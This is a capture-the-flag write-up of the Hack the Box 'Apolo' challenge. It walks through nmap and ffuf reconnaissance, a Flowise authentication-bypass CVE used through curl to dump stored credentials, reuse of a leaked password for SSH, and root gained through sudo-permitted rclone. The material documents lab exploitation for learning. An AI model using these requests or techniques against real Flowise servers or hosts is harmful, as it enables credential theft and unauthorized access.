# Apolo

Apolo is the first of the three full pwn challenges that we solved with *GCC* during the *Hack the Box University CTF 2024: Binary Badlands*

A full pwn challenge is composed of two flags that we have to find in order to complete it, the first one being the user flag and the second one being the root flag. We are given the ip address of a machine / box and we have to first get a RCE on the machine in order to have the user flag, and then privesc in order to get the root flag. 
## Reconnaissance 

```
Nmap scan report for apolo.htb (10.129.242.73)

Host is up (0.015s latency).

rDNS record for 10.129.242.73: apolo.htb

Not shown: 998 closed tcp ports (conn-refused)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)+

| ssh-hostkey: 

|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)

|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)

|_  256 189d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)

80/tcp open  http    nginx 1.18.0 (Ubuntu)

|_http-title: Flowise - Low-code LLM apps builder

|_http-server-header: nginx/1.18.0 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_ker

```

We also check for vhost using ffuf : 

`ffuf -c -w /user/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "[http://$target/](about:blank)" -H "Host: FUZZ.$TARGET" -fc 301`

And we get a hit on a subdomain : `ai.apolo.htb`

Let’s add these two entries in our `/etc/hosts` and enumerate the two hosts : 
```
10.129.242.73 apolo.htb
10.129.242.73 ai.apolo.htb
```
  
The first webpage `apolo.htb` is just a full static website with nothing interesting, our directory fuzzing wasn’t very concluding so we decided to check the other vhost. 

Upon accessing `ai.apolo.htb` we are prompted with a login form for a flowiseai  instance. 

![Login form](/HTB-UNIVERSITY-2024/FullPwn/images/login_form.png)

Checking the version number of the flowingAI instance revealed that it was vulnerable to this CVE : [https://www.exploit-db.com/exploits/52001](https://www.exploit-db.com/exploits/52001)

After using the POC on the website we can confirm that it's indeed vulnerable
 
```
curl [http://ai.apolo.htb/Api/v1/credentials](http://ai.apolo.htb/Api/v1/credentials) [{"id":"6cfda83a-b055-4fd8-a040-57e5f1dae2eb","name":"MongoDB","credentialName":"mongoDBUrlApi","createdDate":"2024-11-14T09:02:56.000Z","updatedDate":"2024-11-14T09:02:56.000Z"}`
```
## User flag

So we can now `curl [http://ai.apolo.htb/Api/v1/credentials6cfda83a-b055-4fd8-a040-57e5f1dae2eb](http://ai.apolo.htb/Api/v1/credentials6cfda83a-b055-4fd8-a040-57e5f1dae2eb)`

And retrieve some credentials : 

```
Username: lewis

Password: C0mpl3xi3Ty!_W1n3

Cluster: cluster0.mongodb.net

Database: myDatabase
```

We could then login onto the flowiseAI instance we thought we had to RCE from there, but a teammate of us pointed out that these credentials could be used to authenticate on the server using SSH. 

![ssh_login](/HTB-UNIVERSITY-2024/FullPwn/images/ssh_login.png)

And voilà : we have our user.flag in the usual location (/home/lewis/user.txt)

 ![user_flag](/HTB-UNIVERSITY-2024/FullPwn/images/user_flag.png)
 
## Root flag

Now that we have a shell on the box, let’s check out what our user can execute on the machine : 

![sudo_L](/HTB-UNIVERSITY-2024/FullPwn/images/sudo_L.png)

We are allowed to execute /usr/bin/rclone with sudo permissions on the machine. 

When checking out the man and help page of the rclone command we have : 

`Rclone  is a command-line program to manage files on cloud storage.  It is a feature-rich alternative to cloud vendors web storage interfaces.`

![rclone](/HTB-UNIVERSITY-2024/FullPwn/images/rclone.png)

We can execute cat through rclone, and since we can execute rclone with root priviledges, we can simply : 

![rootflag](/HTB-UNIVERSITY-2024/FullPwn/images/rootflag.png)
